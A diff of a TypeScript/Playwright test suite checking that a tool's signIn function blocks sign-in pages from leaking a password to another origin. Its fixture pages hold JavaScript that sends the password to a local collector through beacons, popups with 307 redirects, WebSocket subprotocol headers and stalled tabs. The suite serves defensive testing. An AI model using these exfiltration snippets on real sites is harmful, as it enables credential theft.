@@ -34,10 +34,17 @@
  *   Sec-WebSocket-Protocol header), with a password that is a valid subprotocol token (TOKEN_SAFE); a subprotocol that
  *   isn't the password still connects.
  *
- * Each leaking page is first driven by hand in a plain browser (no Run Hound), which shows the leak reaches the other
- * origin: so each signIn test fails only for signIn's reasons. Each page also reports, to its own origin, that it tried
- * (a synchronous XHR before a request that gets stopped, so the report is in before signIn fails; a beacon from pagehide,
- * where a synchronous XHR isn't allowed).
+ * The whole suite's load (0.6.0) adds:
+ * - tabs a page opens while this process is held (GET /stall answers, then holds it), so the browser has shown each
+ *   before Run Hound or Playwright hears of it: Run Hound closed such a tab before Playwright had let it go, the
+ *   renderer the tab shares with the sign-in page stayed paused, and signIn never returned.
+ *
+ * Each leaking page is first driven by hand in a plain browser (`plain`, one no signIn ever uses, so a guard a failed
+ * signIn left behind can't stop the leak), which shows the leak reaches the other origin: so each signIn test fails
+ * only for signIn's reasons. Each page also reports, to its own origin, that it tried (a synchronous XHR before a
+ * request that gets stopped, so the report is in before signIn fails; a beacon from pagehide, where a synchronous XHR
+ * isn't allowed). What must happen is waited for as it happens (the collector's receipt, the report's arrival, a
+ * request), never for a set time; only what must not happen gets a set time to show up (settle).
  *
  * The other origin is `collector`: an HTTP server on another port that records every request, speaks enough of the
  * WebSocket protocol to record handshakes and text messages, answers CORS preflights, and answers /auth with a Basic
@@ -92,6 +99,8 @@ interface Seen {
 interface Collector {
   url: string;
   seen: Seen[];
+  /** The first request `match` accepts, recorded already or when it arrives: the collector's receipt, not a poll. */
+  received(match: (seen: Seen) => boolean): Promise<Seen>;
   close(): Promise<void>;
 }
 
@@ -135,11 +144,20 @@ function readFrames(socket: Socket, onMessage: (text: string) => void): void {
 
 async function startCollector(): Promise<Collector> {
   const seen: Seen[] = [];
+  const waiters = new Set<{ match: (seen: Seen) => boolean; resolve: (seen: Seen) => void }>();
+  const record = (entry: Seen) => {
+    seen.push(entry);
+    for (const waiter of waiters) {
+      if (!waiter.match(entry)) continue;
+      waiters.delete(waiter);
+      waiter.resolve(entry);
+    }
+  };
   const server: Server = createServer(async (req, res) => {
     const chunks: Buffer[] = [];
     for await (const chunk of req) chunks.push(chunk as Buffer);
     const url = req.url ?? "/";
-    seen.push({ kind: "http", method: req.method ?? "GET", url, headers: req.headers, body: Buffer.concat(chunks).toString("utf8") });
+    record({ kind: "http", method: req.method ?? "GET", url, headers: req.headers, body: Buffer.concat(chunks).toString("utf8") });
     const path = new URL(url, "http://x").pathname;
     if (path === "/auth" && !req.headers.authorization) {
       res.writeHead(401, { "www-authenticate": 'Basic realm="collector"', "content-type": "text/plain" });
@@ -160,18 +178,22 @@ async function startCollector(): Promise<Collector> {
   });
   server.on("upgrade", (req: IncomingMessage, socket: Socket) => {
     const url = req.url ?? "/";
-    seen.push({ kind: "ws", method: "GET", url, headers: req.headers, body: "" });
+    record({ kind: "ws", method: "GET", url, headers: req.headers, body: "" });
     socket.on("error", () => undefined);
     const key = req.headers["sec-websocket-key"];
     if (typeof key !== "string") return void socket.destroy();
     socket.write(`HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: ${acceptKey(key)}\r\n\r\n`);
-    readFrames(socket, (text) => seen.push({ kind: "ws-message", method: "MESSAGE", url, headers: req.headers, body: text }));
+    readFrames(socket, (text) => record({ kind: "ws-message", method: "MESSAGE", url, headers: req.headers, body: text }));
   });
   await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
   const { port } = server.address() as AddressInfo;
   return {
     url: `http://127.0.0.1:${port}`,
     seen,
+    received: (match) => {
+      const found = seen.find(match);
+      return found ? Promise.resolve(found) : new Promise<Seen>((resolve) => waiters.add({ match, resolve }));
+    },
     close: () =>
       new Promise<void>((resolve) => {
         for (const socket of sockets) socket.destroy();
@@ -181,6 +203,11 @@ async function startCollector(): Promise<Collector> {
 }
 
 let browser: Browser;
+/**
+ * A browser Run Hound never signs in with, for the "by hand" controls: a guard left attached to `browser` by a signIn
+ * that never returned (it checks every request of the browser) can't stop the leak a control must show.
+ */
+let plain: Browser;
 /** The sign-in page's origin. */
 let site: FixtureServer;
 /** Another origin, where the password must never arrive. */
@@ -211,16 +238,41 @@ function holds(text: string, secret: string): boolean {
   return views.some((v) => v.includes(secret) || v.includes(escaped));
 }
 
+/** Whether what the collector saw carries `secret`: in its address, its body or any header. */
+const carrying =
+  (secret = PASSWORD) =>
+  (s: Seen): boolean =>
+    [s.url, s.body, ...Object.values(s.headers).flat().filter((v): v is string => typeof v === "string")].some((t) => holds(t, secret));
+
 /** What reached the collector carrying `secret`, as "<kind> <method> <url>". */
 function leaks(secret = PASSWORD): string[] {
-  return collector.seen
-    .filter((s) => [s.url, s.body, ...Object.values(s.headers).flat().filter((v): v is string => typeof v === "string")].some((t) => holds(t, secret)))
-    .map((s) => `${s.kind} ${s.method} ${s.url}`);
+  return collector.seen.filter(carrying(secret)).map((s) => `${s.kind} ${s.method} ${s.url}`);
 }
 
 /** The attempts the pages reported to their own origin (`what` of /api/attempted?what=…), in order. */
 function attempts(): string[] {
   return site.requests.filter((r) => r.url.startsWith("/api/attempted?")).map((r) => new URL(r.url, "http://x").searchParams.get("what") ?? "");
+}
+
+/** Waiting for a report of an attempt (see attempted); resolved by the /api/attempted route when it comes in. */
+const attemptWaiters = new Set<{ what: string; resolve: () => void }>();
+
+/** Resolves once the page has reported to its own origin that it tried `what`: already, or when the report comes in. */
+function attempted(what: string): Promise<void> {
+  if (attempts().includes(what)) return Promise.resolve();
+  return new Promise((resolve) => attemptWaiters.add({ what, resolve }));
+}
+
+/**
+ * `event` (a receipt, a report, a request), or a failure that says what never happened. The bound only ends a wait
+ * that failed, before the test's own timeout does so without saying why; nothing waits for it when the event comes.
+ */
+function soon<T>(event: Promise<T>, never: string): Promise<T> {
+  let timer: NodeJS.Timeout | undefined;
+  const failed = new Promise<never>((_, reject) => {
+    timer = setTimeout(() => reject(new Error(never)), 45_000);
+  });
+  return Promise.race([event, failed]).finally(() => clearTimeout(timer));
 }
 
 const shell = (title: string, body: string) => `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>${title}</title></head><body><main>${body}</main></body></html>`;
@@ -296,9 +348,9 @@ form.addEventListener("submit", function (e) {
  * as a synchronous XHR) and then removes the form without navigating — so the page stays alive for a channel that would
  * carry the password out (a worker, a popup, a prefetch), and sign-in still succeeds (the password field is gone). Used
  * for the 0.6.0-review channels the routes never see: with the guarded context those channels are closed, so the
- * password never reaches the collector.
+ * password never reaches the collector. With `finish` "when-done", the form stays until `exfil` calls done().
  */
-function exfilPage(exfil: string): string {
+function exfilPage(exfil: string, finish: "now" | "when-done" = "now"): string {
   return shell(
     "Sign in",
     `<h1>Sign in</h1>
@@ -310,6 +362,7 @@ function exfilPage(exfil: string): string {
 var C = ${JSON.stringify(collector.url)}, W = C.replace(/^http/, "ws");
 function tried(what) { navigator.sendBeacon("/api/attempted?what=" + what); }
 function triedNow(what) { var x = new XMLHttpRequest(); x.open("POST", "/api/attempted?what=" + what, false); x.send(); }
+function done() { var f = document.getElementById("f"); if (f) f.remove(); document.getElementById("ok").hidden = false; }
 document.getElementById("f").addEventListener("submit", function (e) {
   e.preventDefault();
   var pw = document.getElementById("pw").value;
@@ -317,8 +370,7 @@ document.getElementById("f").addEventListener("submit", function (e) {
     .then(function (r) {
       if (!r.ok) { var a = document.getElementById("err"); a.textContent = "Email or password is incorrect"; a.hidden = false; return; }
       try { ${exfil} } catch (err) {}
-      document.getElementById("f").remove();
-      document.getElementById("ok").hidden = false;
+      ${finish === "now" ? "done();" : ""}
     });
 });
 </script>`,
@@ -485,8 +537,25 @@ window.open = function () { realOpen.call(window, signInOrigin + "/probe-race/bo
 /** A page that, once signed in, sends the password from pagehide and closes its own tab (window.close). */
 const SELF_CLOSE = `tried("self-close"); addEventListener("pagehide", function () { navigator.sendBeacon(C + "/closed", pw); }); window.close();`;
 
+/** How long GET /stall holds this process after it has answered. */
+const STALL_MS = 1_000;
+/** How many tabs /channel/popup-stalled opens, one after each /stall. */
+const STALLED_ROUNDS = 3;
+
+/**
+ * The popup channel (CHANNELS.popup: a tab that POSTs the password to /bounce, a 307 to the collector), opened
+ * STALLED_ROUNDS times, each right after GET /stall has answered and while it holds this process (signIn, Playwright
+ * and both servers run here): the browser creates and shows the tab before Run Hound or Playwright hears of it, the
+ * order a loaded machine makes by chance (0.6.0, the whole suite). The form stays until the last round (done()).
+ */
+const STALLED_POPUPS = `tried("popup-stalled"); var round = 0; (function next() {
+  if (round++ >= ${STALLED_ROUNDS}) return done();
+  fetch("/stall").then(function () { var win = window.open("/bounce-tab", "_blank"); if (win) win.name = pw; setTimeout(next, 50); });
+})();`;
+
 beforeAll(async () => {
   browser = await getBrowser();
+  plain = await chromium.launch();
   collector = await startCollector();
   const pages: Record<string, string> = {};
   for (const leak of LEAKS) pages[`/leak/${leak.name}`] = signInPage(leak.script, leak.formAttributes);
@@ -512,6 +581,7 @@ beforeAll(async () => {
       "/channel/prefetch-retype": exfilPage(CHANNELS["prefetch-retype"]),
       "/channel/service-worker": exfilPage(CHANNELS["service-worker"]),
       "/channel/self-close": exfilPage(SELF_CLOSE),
+      "/channel/popup-stalled": exfilPage(STALLED_POPUPS, "when-done"),
       "/bounce-tab": bounceTabPage(),
       // 0.6.0 review weak-password false positives: a substring on another origin, and a same-origin query equal to a
       // weak password. Neither is a leak, so sign-in must still succeed.
@@ -599,6 +669,21 @@ self.addEventListener("message", (e) => { fetch(${JSON.stringify(collector.url)}
       "POST /api/attempted": (_req, res) => {
         res.writeHead(204);
         res.end();
+        const reported = attempts();
+        for (const waiter of attemptWaiters) {
+          if (!reported.includes(waiter.what)) continue;
+          attemptWaiters.delete(waiter);
+          waiter.resolve();
+        }
+      },
+      // Answered at once, then this process is held for STALL_MS (STALLED_POPUPS): nothing here runs meanwhile.
+      "GET /stall": (_req, res) => {
+        res.writeHead(204);
+        res.end();
+        const until = Date.now() + STALL_MS;
+        while (Date.now() < until) {
+          // Held on purpose: the browser goes on alone.
+        }
       },
       "GET /favicon.ico": (_req, res) => {
         res.writeHead(204);
@@ -610,6 +695,7 @@ self.addEventListener("message", (e) => { fetch(${JSON.stringify(collector.url)}
 
 afterAll(async () => {
   await closeBrowser();
+  await plain?.close();
   await site?.close();
   await collector?.close();
 });
@@ -624,24 +710,30 @@ function reset(): void {
 }
 
 /**
- * Signs in by hand in a plain browser context (no Run Hound): what a person's browser would do on `path`. A page that
- * `stays` (its leak goes out from another tab) is waited on until something carrying the password reaches the collector.
+ * Signs in by hand in a plain browser (no Run Hound): what a person's browser would do on `path`. A page that `stays`
+ * (its leak goes out from another tab) is waited on until the collector receives something carrying the password.
  */
 async function signInByHand(path: string, stays = false, password = PASSWORD): Promise<void> {
-  const context = await browser.newContext();
+  const context = await plain.newContext();
   try {
     const page = await context.newPage();
     await page.goto(`${site.url}${path}`, { waitUntil: "networkidle" });
     await page.locator("#e").fill(EMAIL);
     await page.locator("#pw").fill(password);
     await page.locator("button[type=submit]").click();
-    if (stays) await expect.poll(() => leaks(password).length, { timeout: 10_000 }).toBeGreaterThan(0);
-    else await page.waitForURL((url) => url.pathname !== path, { timeout: 10_000 });
+    if (stays) await soon(collector.received(carrying(password)), `nothing carrying the password reached the collector from ${path}`);
+    else await page.waitForURL((url) => url.pathname !== path);
     await page.waitForLoadState("load").catch(() => undefined);
   } finally {
     await context.close();
   }
 }
+
+/** Resolves once the collector has received something carrying `secret` (a control's leak), else says where from. */
+const leaked = (from: string, secret = PASSWORD) => soon(collector.received(carrying(secret)), `nothing carrying the password reached the collector from ${from}`);
+
+/** Resolves once the page has reported that it tried `what` (attempted), else says it never did. */
+const reported = (what: string) => soon(attempted(what), `the page never reported that it tried "${what}"`);
 
 /** signIn's outcome: what it resolved with, or the SignInError it threw (anything else fails the test). */
 async function outcomeOf(promise: Promise<SignedIn>): Promise<SignedIn | SignInError> {
@@ -661,8 +753,8 @@ describe("the leaking pages, by hand (so the signIn tests below fail only for si
     it(`${leak.name}: ${leak.does} reaches the other origin`, async () => {
       reset();
       await signInByHand(`/leak/${leak.name}`, leak.stays);
-      await expect.poll(() => leaks().length, { message: `nothing carrying the password reached the collector from /leak/${leak.name}` }).toBeGreaterThan(0);
-      expect(attempts()).toContain(leak.name);
+      await leaked(`/leak/${leak.name}`);
+      await reported(leak.name);
     });
   }
 });
@@ -672,9 +764,9 @@ describe("signIn stops the password on its way to another origin", () => {
     it(`${leak.name}: ${leak.does}`, async () => {
       reset();
       const outcome = await outcomeOf(signIn(browser, account(`/leak/${leak.name}`)));
-      await settle();
       // The page did try.
-      expect(attempts()).toContain(leak.name);
+      await reported(leak.name);
+      await settle();
       // Nothing carrying the password reached the other origin, in any form.
       expect(leaks()).toEqual([]);
       if (outcome instanceof SignInError) {
@@ -738,7 +830,7 @@ describe("signIn: a two-step password step redirected to a host the safety gate 
       expect(outcome, "signIn should have failed").toBeInstanceOf(SignInError);
       expect((outcome as SignInError).message).not.toContain(PASSWORD);
       // Both steps ran on the sign-in origin: the password step's POST was sent there.
-      expect(attempts()).toContain("password-step");
+      await reported("password-step");
       expect(site.requests.filter((r) => r.method === "POST" && r.url.startsWith("/two/")).map((r) => r.url)).toEqual([`/two/password-${status}`]);
       expect(leaks()).toEqual([]);
       expect(collector.seen.filter((s) => s.method !== "GET").map((s) => `${s.method} ${s.url}`)).toEqual([]);
@@ -746,17 +838,17 @@ describe("signIn: a two-step password step redirected to a host the safety gate 
   }
 });
 
-/** Signs in by hand on a channel page (no Run Hound) and waits until something carrying the password reaches the collector. */
+/** Signs in by hand on a channel page in a plain browser (no Run Hound) and waits for the collector to receive the password. */
 async function channelReachesByHand(path: string): Promise<void> {
-  const context = await browser.newContext();
+  const context = await plain.newContext();
   try {
     const page = await context.newPage();
     await page.goto(`${site.url}${path}`, { waitUntil: "networkidle" });
     await page.locator("#e").fill(EMAIL);
     await page.locator("#pw").fill(PASSWORD);
     await page.locator("button[type=submit]").click();
-    await page.locator("#ok").waitFor({ timeout: 10_000 });
-    await expect.poll(() => leaks().length, { timeout: 10_000, message: `nothing carrying the password reached the collector from ${path}` }).toBeGreaterThan(0);
+    await page.locator("#ok").waitFor();
+    await leaked(path);
   } finally {
     await context.close();
   }
@@ -779,7 +871,7 @@ describe("signIn closes the channels the context routes never see (0.6.0 review)
     it(`by hand: ${does} reaches the other origin`, async () => {
       reset();
       await channelReachesByHand(`/channel/${name}`);
-      expect(attempts()).toContain(name);
+      await reported(name);
     });
   }
 
@@ -789,9 +881,9 @@ describe("signIn closes the channels the context routes never see (0.6.0 review)
     it(`${name}: ${does} is stopped, and the password never reaches the other origin`, async () => {
       reset();
       const result = await signIn(browser, account(`/channel/${name}`));
-      await settle();
       expect(result).toHaveProperty("state");
-      expect(attempts()).toContain(name);
+      await reported(name);
+      await settle();
       expect(leaks()).toEqual([]);
       // The password (JSON-escaped in the body) went once, to the sign-in request on the sign-in origin.
       const escaped = JSON.stringify(PASSWORD).slice(1, -1);
@@ -800,13 +892,44 @@ describe("signIn closes the channels the context routes never see (0.6.0 review)
   }
 });
 
+describe("signIn: tabs opened while this process is held, so the browser shows each before anyone here hears of it", () => {
+  it("by hand: each tab carries the password to the other origin", async () => {
+    reset();
+    await channelReachesByHand("/channel/popup-stalled");
+    await reported("popup-stalled");
+    expect(site.requests.filter((r) => r.url === "/stall")).toHaveLength(STALLED_ROUNDS);
+  });
+
+  // 0.6.0, the whole suite: Run Hound closed such a tab before Playwright had let it go (runIfWaitingForDebugger), the
+  // renderer it shares with the sign-in page stayed paused, and signIn never returned. Its own browser: a signIn that
+  // never returns leaves its guard on the browser it was given.
+  it("with signIn: each tab is closed without freezing the sign-in page, nothing gets out, and signing in succeeds", async () => {
+    reset();
+    const own = await chromium.launch();
+    try {
+      const result = await soon(signIn(own, account("/channel/popup-stalled")), "signIn never returned: the sign-in page stopped answering once a tab it opened was closed");
+      expect(result).toHaveProperty("state");
+      await reported("popup-stalled");
+      expect(site.requests.filter((r) => r.url === "/stall")).toHaveLength(STALLED_ROUNDS);
+      await settle();
+      expect(leaks()).toEqual([]);
+      // No tab got as far as its own page: each was closed, and every request it made was stopped.
+      expect(site.requests.filter((r) => r.url === "/bounce-tab" || r.url === "/bounce").map((r) => r.url)).toEqual([]);
+      const escaped = JSON.stringify(PASSWORD).slice(1, -1);
+      expect(site.requests.filter((r) => r.body.includes(PASSWORD) || r.body.includes(escaped)).map((r) => `${r.method} ${r.url}`)).toEqual(["POST /api/login"]);
+    } finally {
+      await own.close();
+    }
+  });
+});
+
 describe("signIn does not fail a legitimate sign-in on a weak-password false positive (0.6.0 review)", () => {
   it(`"${WEAK_SUBSTRING}" as a substring of a token on another origin ("latest"): signs in`, async () => {
     reset();
     const result = await signIn(browser, account("/weak/substring", { password: WEAK_SUBSTRING }));
     expect(result).toHaveProperty("state");
     // The cross-origin request that merely contains the password as a substring was not stopped: it reached the collector.
-    await expect.poll(() => collector.seen.some((s) => s.url.includes("ref=latest"))).toBe(true);
+    await soon(collector.received((s) => s.url.includes("ref=latest")), "the request with ?ref=latest never reached the collector");
     // The password itself only ever went to the sign-in request.
     expect(site.requests.filter((r) => r.body.includes(`"password":"${WEAK_SUBSTRING}"`)).map((r) => `${r.method} ${r.url}`)).toEqual(["POST /api/login"]);
   });
@@ -823,7 +946,7 @@ describe("signIn does not fail a legitimate sign-in on a weak-password false pos
     reset();
     const result = await signIn(browser, account("/weak/json-substring", { password: WEAK_SUBSTRING }));
     expect(result).toHaveProperty("state");
-    await expect.poll(() => collector.seen.some((s) => s.url === "/collect" && s.body === JSON.stringify({ v: "latest" }))).toBe(true);
+    await soon(collector.received((s) => s.url === "/collect" && s.body === JSON.stringify({ v: "latest" })), "the JSON body never reached the collector");
   });
 
   it(`"${WEAK_SUBSTRING}" inside a Basic header's value sent to another origin (user:latest): signs in`, async () => {
@@ -831,7 +954,7 @@ describe("signIn does not fail a legitimate sign-in on a weak-password false pos
     const result = await signIn(browser, account("/weak/basic-substring", { password: WEAK_SUBSTRING }));
     expect(result).toHaveProperty("state");
     const basic = `Basic ${Buffer.from("user:latest").toString("base64")}`;
-    await expect.poll(() => collector.seen.some((s) => s.url === "/basic" && s.headers.authorization === basic)).toBe(true);
+    await soon(collector.received((s) => s.url === "/basic" && s.headers.authorization === basic), "the Basic header never reached the collector");
   });
 });
 
@@ -847,7 +970,7 @@ describe("signIn stops a strong password in a same-origin request's address (0.6
       expect((outcome as SignInError).message).toMatch(/sends the password in the page address/);
       expect((outcome as SignInError).message).not.toContain(PASSWORD);
       // The page did try, and the request was stopped before it reached the app's server (and its access log).
-      expect(attempts()).toContain(path.slice("/strong/".length));
+      await reported(path.slice("/strong/".length));
       expect(site.requests.filter((r) => r.url.startsWith("/api/state")).map((r) => r.url)).toEqual([]);
     });
   }
@@ -863,7 +986,7 @@ describe("signIn stops a weak password under a password key in a same-origin req
       const outcome = await outcomeOf(signIn(browser, account(path, { password: COMMON })));
       expect(outcome, "signIn should have failed").toBeInstanceOf(SignInError);
       expect((outcome as SignInError).message).toMatch(/sends the password in the page address/);
-      expect(attempts()).toContain(what);
+      await reported(what);
       expect(site.requests.filter((r) => r.url.startsWith("/api/state")).map((r) => r.url)).toEqual([]);
     });
   }
@@ -872,7 +995,7 @@ describe("signIn stops a weak password under a password key in a same-origin req
 describe("signIn: a page that closes its own tab after signing in, with a pagehide send (0.6.0 review, round 2)", () => {
   it("by hand: Chromium ignores window.close() in a tab opened like Run Hound opens it (two history entries), so nothing is sent", async () => {
     reset();
-    const context = await browser.newContext();
+    const context = await plain.newContext();
     try {
       const page = await context.newPage();
       await page.goto(`${site.url}/channel/self-close`, { waitUntil: "networkidle" });
@@ -880,9 +1003,9 @@ describe("signIn: a page that closes its own tab after signing in, with a pagehi
       await page.locator("#e").fill(EMAIL);
       await page.locator("#pw").fill(PASSWORD);
       await page.locator("button[type=submit]").click();
-      await page.locator("#ok").waitFor({ timeout: 10_000 });
+      await page.locator("#ok").waitFor();
+      await reported("self-close");
       await settle();
-      expect(attempts()).toContain("self-close");
       expect(page.isClosed()).toBe(false);
       expect(leaks()).toEqual([]);
     } finally {
@@ -893,9 +1016,9 @@ describe("signIn: a page that closes its own tab after signing in, with a pagehi
   it("with signIn, window.close() does nothing either: signs in, and the pagehide send never goes", async () => {
     reset();
     const result = await signIn(browser, account("/channel/self-close"));
-    await settle();
     expect(result).toHaveProperty("state");
-    expect(attempts()).toContain("self-close");
+    await reported("self-close");
+    await settle();
     expect(leaks()).toEqual([]);
   });
 });
@@ -903,13 +1026,20 @@ describe("signIn: a page that closes its own tab after signing in, with a pagehi
 describe("signIn: a popup the landing page opens while the sessionStorage probe is opened (0.6.0 review, round 2)", () => {
   it("by hand: when the landing page's window.open is used, its own tab carries the password to the other origin", async () => {
     reset();
+    // Signing in by hand has the app's server put this password in the page of the landing page's own tab (lastPassword).
     await signInByHand("/probe-race/sign-in");
-    const context = await browser.newContext();
+    const context = await plain.newContext();
     try {
       const page = await context.newPage();
-      await page.goto(`${site.url.replace("//127.0.0.1:", "//localhost:")}/probe-race/landing`, { waitUntil: "networkidle" });
+      await page.goto(`${site.url.replace("//127.0.0.1:", "//localhost:")}/probe-race/landing`);
+      // The tab the replaced window.open opens first POSTs the password to /bounce on the sign-in origin.
+      const posted = context.waitForEvent("request", { predicate: (r) => r.method() === "POST" && new URL(r.url()).pathname === "/bounce", timeout: 0 });
       await page.evaluate(() => void window.open("/anything"));
-      await expect.poll(() => leaks().length, { timeout: 10_000 }).toBeGreaterThan(0);
+      const bounce = await soon(posted, "the landing page's own tab never posted to /bounce");
+      expect(holds(bounce.postData() ?? "", PASSWORD)).toBe(true);
+      // /bounce is a 307: the browser sends the same POST, password and all, to the collector.
+      await leaked("the landing page's own tab");
+      expect(leaks()).toEqual(["http POST /landing"]);
     } finally {
       await context.close();
     }
@@ -934,16 +1064,17 @@ describe("signIn: the password requested as a WebSocket subprotocol (0.6.0 revie
   it("by hand: the handshake's Sec-WebSocket-Protocol header carries the password to the other origin", async () => {
     reset();
     await signInByHand("/leak-token/ws-protocol", false, TOKEN_SAFE);
-    await expect.poll(() => leaks(TOKEN_SAFE), { message: "the handshake carrying the password never reached the collector" }).toEqual(["ws GET /ws"]);
+    await leaked("/leak-token/ws-protocol", TOKEN_SAFE);
+    expect(leaks(TOKEN_SAFE)).toEqual(["ws GET /ws"]);
     expect(collector.seen.find((s) => s.kind === "ws")?.headers["sec-websocket-protocol"]).toBe(TOKEN_SAFE);
-    expect(attempts()).toContain("ws-protocol");
+    await reported("ws-protocol");
   });
 
   it("with signIn: the handshake is stopped before it is sent, and signing in fails with the reason", async () => {
     reset();
     const outcome = await outcomeOf(signIn(browser, account("/leak-token/ws-protocol", { password: TOKEN_SAFE })));
+    await reported("ws-protocol");
     await settle();
-    expect(attempts()).toContain("ws-protocol");
     expect(leaks(TOKEN_SAFE)).toEqual([]);
     expect(collector.seen.filter((s) => s.kind !== "http").map((s) => `${s.kind} ${s.url}`)).toEqual([]);
     expect(outcome, "signIn should have failed").toBeInstanceOf(SignInError);
@@ -955,8 +1086,9 @@ describe("signIn: the password requested as a WebSocket subprotocol (0.6.0 revie
     reset();
     const result = await signIn(browser, account("/weak/ws-protocol", { password: COMMON }));
     expect(result).toHaveProperty("state");
-    expect(attempts()).toContain("ws-graphql");
-    await expect.poll(() => collector.seen.find((s) => s.kind === "ws" && s.url === "/ws-graphql")?.headers["sec-websocket-protocol"]).toBe("graphql-ws");
+    await reported("ws-graphql");
+    const handshake = await soon(collector.received((s) => s.kind === "ws" && s.url === "/ws-graphql"), "the graphql-ws handshake never reached the collector");
+    expect(handshake.headers["sec-websocket-protocol"]).toBe("graphql-ws");
   });
 });
 
